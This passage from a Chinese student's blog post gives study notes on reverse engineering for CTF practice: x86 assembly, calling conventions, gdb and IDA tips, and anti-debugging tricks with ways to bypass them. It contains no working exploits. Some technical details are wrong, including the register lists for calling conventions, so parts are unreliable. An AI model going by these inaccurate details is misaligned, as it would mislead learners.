他们对拱形的热爱导致了他们的建筑中的拱形元素是常常可见的. 由基本积木组成的拱形, 
在建筑中又成为了新的基本元素. 可以说这样的组合的元素得到了一次抽象, 
变成了一种基本的元素符号.&lt;/p&gt;

&lt;p&gt;在语言里面也有这样的事情, 简单语言所定义的复杂含义在被意符指代(refer)之后, 
就从一种块状的复合物的形象变成了独立的个体元素. 
好像是原来一大块的内容淡出了人们的视野, 取而代之的是一张小小的标签, 
标签上和原来的内容还连着的一根细细的丝线. 就像是”爽”字的故事(传说? )&lt;/p&gt;

&lt;p&gt;比如说在程序设计里面函数也就像是一种抽象(操作过程的抽象):&lt;/p&gt;
&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ruby code&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# massive codes&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;就像是一个把一堆代码包裹在一起, 用一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;func&lt;/code&gt;的符号来指引的思想. 
(但是实际的执行并不是直接像是在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;func&lt;/code&gt;的位置插入一段代码的方式来实现的, 
而是通过打开一个新的环境&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scope&lt;/code&gt;, 在其中执行完代码后返回值, 
这个和汇编还有C的函数调用都是一样的, 打开一个栈, 运行, 关闭栈, 返回)&lt;/p&gt;

&lt;h3 id=&quot;解剖&quot;&gt;解剖&lt;/h3&gt;
&lt;p&gt;和组合相对应的是解剖, 将一个硕大无比的主体通过分割的方式化简为一个个的小的主体, 
在部分之间通过数据的流动和交换联系在一起. (哎呀, 好像变成了对组合的解释了. )&lt;/p&gt;

&lt;p&gt;将一个整体分割成部分进行审视, 可以得到对整体的更好的认识. 
譬如说ruby中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;String&lt;/code&gt;类型的对象的方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gsub&lt;/code&gt;对于正则表达式匹配的时候的特性, 
作为整体的时候可能难以理解, 但是可以将它分割成几个逻辑部分, 查找, 替换, 再查找. 
于是就可以将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gsub&lt;/code&gt;命令写成这样的形式:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ruby code&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fake_gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regexp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 查找&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regexp&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Regexp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;last_match&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 替换&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pre_match&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;post_match&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 再查找&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fake_gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regexp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 找不到就停止查找, 返回字符串&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# example&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;a b c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/\w/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# =&amp;gt; &quot;* * *&quot; &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;于是对程序的理解就会至少深那么一点点吧?&lt;/p&gt;

&lt;p&gt;那么简单的思想就先到这里, 以后可以想得更加深入一些.&lt;/p&gt;

&lt;h2 id=&quot;逆向的前置技能&quot;&gt;逆向的前置技能&lt;/h2&gt;
&lt;h3 id=&quot;软件的正向开发&quot;&gt;软件的正向开发&lt;/h3&gt;
&lt;p&gt;首先要会编程, 知道如何构造一个软件.&lt;/p&gt;

&lt;p&gt;(巧了, 我们学长今天带我们看例子的时候就吐槽了好多次, 
说写例子程序的人可能编程技术不太好, 写判断代码的时候写的顺序是错误的, 
导致判断代码的作用几乎没有. )&lt;/p&gt;

&lt;p&gt;知道如何编写一个软件的话, 在看汇编代码的时候也就会有一个方向去思考尝试.&lt;/p&gt;

&lt;h3 id=&quot;汇编&quot;&gt;汇编&lt;/h3&gt;
&lt;p&gt;一般来说, 逆向遇到的程序都是打包好的二进制可执行文件, 
用反汇编程序查看可以看到里面的汇编指令. 得到程序的运行的逻辑. 为了看懂程序, 
知道简单的汇编语言是有必要的.&lt;/p&gt;

&lt;p&gt;(我在&lt;a href=&quot;../../../2021/10/29/untitled(1).html&quot;&gt;Untitled(1)&lt;/a&gt;里面有过简单介绍. )&lt;/p&gt;

&lt;p&gt;这里简单补充一些&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x86&lt;/code&gt;汇编的一些之前没有很关注的点:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;特殊寄存器&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;REFLAGS&lt;/code&gt;, 里面有:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZF&lt;/code&gt; Zero Flag, 在运算结果为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;的时候被设置为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OF&lt;/code&gt; Overflow Flag, 在运算结果溢出的时候被设置为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;等等&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;特殊的一些数据移动指令 (虽然很少见到就是了)
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xchg&lt;/code&gt; 交换寄存器&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bswap&lt;/code&gt; 交换比特&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xadd&lt;/code&gt; 交换并相加&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;特殊的一些栈操作指令
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pushad&lt;/code&gt; 保存通用寄存器&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;popad&lt;/code&gt; 恢复通用寄存器&lt;/li&gt;
      &lt;li&gt;上面的那一对往往会在需要脱壳程序里面出现, 就是程序在壳外&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pushad&lt;/code&gt;一下, 然后解开壳, 
这样以后又&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;popad&lt;/code&gt;, 接下来正常运行. 往往会有那么一个逻辑.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;调用和返回指令
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; 调用函数&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; 从函数返回 (在PWN的Overflow里面很好用)&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iret&lt;/code&gt; 从中断返回&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int&lt;/code&gt; 软件中断 (比如在混淆调试的方式里面, 常常有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int 3&lt;/code&gt;来扰乱调试器调试. )&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;函数调用(参数如何传递的)约定 (虽然好像不必记忆, 了解即可. )
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cdecl&lt;/code&gt; 参数全部通过栈传递, 调用者清理参数&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;thiscall&lt;/code&gt; 前两个参数放&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bx&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cx&lt;/code&gt;, 其余参数放在栈里面, 调用者清理&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fastcall&lt;/code&gt; 第一个参数放&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cx&lt;/code&gt;里面, 调用者清理&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdcall&lt;/code&gt; 被调用者清理&lt;/li&gt;
      &lt;li&gt;linux
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ax&lt;/code&gt;放系统调用号, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;di&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;si&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dx&lt;/code&gt;, (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r10&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r9&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt;)放参数&lt;/li&gt;
          &lt;li&gt;linux x64: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r9&lt;/code&gt; 放参数, 被调用者清理&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;windows x64: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcx&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r9&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt;, 被调用者清理&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;函数调用的局部变量是放在栈上的  &lt;br /&gt;
假如有一个函数是这样的: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;func(arg1, arg2, arg3, ..., argn)&lt;/code&gt;  &lt;br /&gt;
那么在传递参数的时候, 前面的几个参数会被用寄存器传递(从左到右), 
然后后面的参数数量比较多, 没法用寄存器来传递, 就会用栈来传递(从右到左)  &lt;br /&gt;
但是传递归传递, 最终都还是要写入函数所在的栈里面的(从右到左, 这样的原因是因为栈是递减的)&lt;/li&gt;
  &lt;li&gt;x86函数模版
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push ebp
mov ebp, esp
sub esp, stack_size
; 将传递的参数写到栈里面
mov [ebp + offset], rdx ; 瞎写的, 不知道对不对, 大概这个意思吧
; ...
; 
mov esp, ebp
pop ebp
; 默认的返回值是通过eax返回的
ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;多种编译器的输出pattern&quot;&gt;多种编译器的输出pattern&lt;/h3&gt;
&lt;p&gt;不同的编译器的输出是有一定的模式可以找的, 
这样的话就有助于看代码的时候很快就可以聚焦到真正有效的代码, 
而不是在外面的模式的代码上迷幻浪费时间.&lt;/p&gt;

&lt;p&gt;(虽然我现在接触的种类有限, 大部分都是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc&lt;/code&gt;的编译结果. )&lt;/p&gt;

&lt;p&gt;比如在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc&lt;/code&gt;里面, 在函数的开头就经常有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push ebp&lt;/code&gt;等的东西, 几乎可以忽略.&lt;/p&gt;

&lt;p&gt;还有就是在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vc&lt;/code&gt;里面, 常常有成堆的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp&lt;/code&gt;命令出现, 也是一个很好的例子.&lt;/p&gt;

&lt;p&gt;以后多见应该可以增加经验, 现在的我还是too young too simple了.&lt;/p&gt;

&lt;h3 id=&quot;操作系统-计算机组成原理&quot;&gt;操作系统, 计算机组成原理&lt;/h3&gt;
&lt;p&gt;…&lt;/p&gt;

&lt;h3 id=&quot;密码学入门&quot;&gt;密码学入门&lt;/h3&gt;
&lt;p&gt;一般逆向注册机的问题, 就需要解决一个破解密码的问题, 于是就需要一些简单的密码学知识. 
(虽然和真的密码学比起来还是很简单的. )&lt;/p&gt;

&lt;p&gt;(在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;里面有一个叫&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;z3&lt;/code&gt;的很棒的库可以用来解决类似的问题, 
&lt;del&gt;我觉得我可以以后试试能不能也实现一个类似的, 听起来像是在做梦&lt;/del&gt;. )&lt;/p&gt;

&lt;h3 id=&quot;耐心&quot;&gt;耐心&lt;/h3&gt;
&lt;p&gt;嗯, 确实很重要.&lt;/p&gt;

&lt;h2 id=&quot;逆向的常规思路&quot;&gt;逆向的常规思路&lt;/h2&gt;
&lt;p&gt;准备工作&lt;/p&gt;

&lt;h3 id=&quot;找函数&quot;&gt;找函数&lt;/h3&gt;
&lt;p&gt;这种一般是通过程序的运行表现来找主要的工作函数. 因为一个程序可以有一些标志性的输出, 
往往就可以通过这种方式来得到主要的函数的位置.&lt;/p&gt;

&lt;p&gt;或者也可以利用调试器来找.&lt;/p&gt;

&lt;h3 id=&quot;抄写&quot;&gt;抄写&lt;/h3&gt;
&lt;p&gt;就是把难看的汇编代码用自己比较熟悉的语言整理逻辑之后重新写成一个简单的代码.&lt;/p&gt;

&lt;p&gt;这个时候可以利用IDA的辅助.&lt;/p&gt;

&lt;h3 id=&quot;写逆&quot;&gt;写逆&lt;/h3&gt;
&lt;p&gt;根据抄写后的代码, 比如说里面就有一个加密的模型, 
然后就根据这个加密的模型写一个解密的代码.&lt;/p&gt;

&lt;h2 id=&quot;调试器以及反调试的问题&quot;&gt;调试器以及反调试的问题&lt;/h2&gt;
&lt;p&gt;这个时候, 作为mac用户, 我留下了嫉妒的泪水…&lt;/p&gt;

&lt;p&gt;(不得不说, windows下的好东西真是多, 比如x64dbg, ida pro也很好得到)&lt;/p&gt;

&lt;p&gt;那么我就要学习一下如何使用一些(我能用的)好用的调试器了, 首先是gdb, 
以后慢慢学, (虽然现在我觉得我用的那些足够了, 但是今天学习让我认识到了不足, 
只用我会的那么点还是不足以达到解决学长给的题目的水平的), (据说r2也不错, 不了解).&lt;/p&gt;

&lt;p&gt;然后静态的东西, ida pro好耶.&lt;/p&gt;

&lt;h3 id=&quot;调试器的利用基础&quot;&gt;调试器的利用基础&lt;/h3&gt;
&lt;p&gt;一个小目标: 学会这些, (虽然现在还不全会, 更不用说像学长那样玩得那么溜).&lt;/p&gt;

&lt;p&gt;(我还是以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt;为主吧… )&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;暂停和运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl-C&lt;/code&gt; / &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;单步
    &lt;ul&gt;
      &lt;li&gt;步过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; / &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ni&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;步进 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt; / &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;si&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;断点
    &lt;ul&gt;
      &lt;li&gt;指令断点 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;内存断点 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;watch&lt;/code&gt; / &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rwatch&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;硬件断点&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;查看内存 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ida-的一些技巧&quot;&gt;IDA 的一些技巧&lt;/h3&gt;
&lt;p&gt;只是零散地记录一下而已.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;F5&lt;/code&gt; 可以将代码输出成一个类似于C代码一样的东西&lt;/li&gt;
  &lt;li&gt;在IDA里面可以选择某一段的数据并将其标记为特定的类型, 比如选中一段代码, 
右键取消掉类型, 然后可以重新设置新的类型&lt;/li&gt;
  &lt;li&gt;在IDA里面可以修改符号的名字, 为了更好看&lt;/li&gt;
  &lt;li&gt;然后对于F5输出的伪C代码, 可以通过修改参数的类型, 符号等方式帮助程序更好地解析, 
没准最后会好看一点.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;反调试&quot;&gt;反调试&lt;/h3&gt;
&lt;p&gt;假如我能让一个东西被轻松调试的话, 那么这个东西就是我砧板上的鱼肉了. 
所以程序为了避免成为砧板上的鱼肉, 自然要有各种方法进行挣脱.&lt;/p&gt;

&lt;p&gt;一种思路就是&lt;strong&gt;检查&lt;/strong&gt;一下自己是不是被调试了, 假如被调试的话就不会正常工作.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;扫描进程  &lt;br /&gt;
看看有没有名字十分可疑的进程, 比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x64dbg&lt;/code&gt;等的进程, 
有的话就可以认为自己被调试了  &lt;br /&gt;
这种可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./program &amp;amp;&lt;/code&gt;先得到其PID, 然后再在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt;里面用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;at PID&lt;/code&gt;的方式调试, 
因为一开始运行的时候并没有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt;, 所以可以绕开. (或者就是直接把这个判断绕开? )&lt;/li&gt;
  &lt;li&gt;检测特殊标志  &lt;br /&gt;
在windows里面有API&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsDebuggerPresent()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CheckRemoteDebuggerPresent()&lt;/code&gt;, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtGlobalflag()&lt;/code&gt;等, 可以判断自己是不是在被调试.  &lt;br /&gt;
可以通过hook这些API, 或者在运行的时候把标识给强制写掉, 
x64dbg的插件ScyllaHide可以帮助绕过检测(手头没有, 没法尝试)&lt;/li&gt;
  &lt;li&gt;检测程序运行速度  &lt;br /&gt;
因为被调试的程序运行速度会很慢  &lt;br /&gt;
可以优化或者直接把时间判断的条件语句给干掉&lt;/li&gt;
  &lt;li&gt;抛出异常  &lt;br /&gt;
因为异常会被调试器捕捉到, 然后再会决定要不要交还给程序, 
于是程序可以通过抛出一个异常, 假如不可以被自己接受到, 
那么就可以认为自己的异常被调试器拦截了, 自己就在被调试了.  &lt;br /&gt;
可以尝试让调试器把异常交还给程序. 关于在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt;里面的一些介绍:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info signals&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info handle&lt;/code&gt; 会显示信号&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handle &amp;lt;signal_name&amp;gt; &amp;lt;descriptions&amp;gt;&lt;/code&gt; 会设置对应的信号出现的对待方式, 
具体的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;descriptions&amp;gt;&lt;/code&gt;有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nostop&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stop&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;noprint&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;noignore&lt;/code&gt;等&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;代码段检测  &lt;br /&gt;
用到的原理就是调试器的断点一般就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int 3&lt;/code&gt;, 
然后软件可以计算一下自己代码段里面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int 3&lt;/code&gt;的数量然后再和原来应该有的数量相对比, 
假如不一样(多了)的话, 说明有调试器在自己里面设了断点. 自己就被调试了.  &lt;br /&gt;
在调试器里面改变默认断点类型. 变成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;long int 3&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ud2&lt;/code&gt;等.&lt;/li&gt;
  &lt;li&gt;自检验&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外一种想法就是你调试任你调试, 但是我把代码写得让你很难调试, &lt;strong&gt;扰乱&lt;/strong&gt;正常的调试.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;异常  &lt;br /&gt;
比如说塞一堆的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int 3&lt;/code&gt;让调试变得很麻烦&lt;/li&gt;
  &lt;li&gt;花指令  &lt;br /&gt;
就是花里胡哨的指令, 从这里跳转到那里然后又跳转回来, 反复横跳, 让看代码的人云里雾里&lt;/li&gt;
  &lt;li&gt;自调试  &lt;br /&gt;
有种走别人的路, 让别人无路可走的味道. 因为没有办法同时存在两个调试器, 
然后这种自调试还可以利用调试的特性, 比如说程序跳出一个中断, 
然后自己的调试器捕捉到这个中断后处理数据再返回给程序, 
就把原来一个程序能干的事分成了两个程序干的事情, 增加了困难.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;逆向的高级操作&quot;&gt;逆向的高级操作&lt;/h2&gt;
&lt;h3 id=&quot;vm-类型&quot;&gt;vm 类型&lt;/h3&gt;
&lt;p&gt;有点像是自己用代码编写了一个虚拟的机器来执行命令, 有点像是这样的东西:&lt;/p&gt;
&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;operator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# do sth&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; 
  &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# do other thing&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

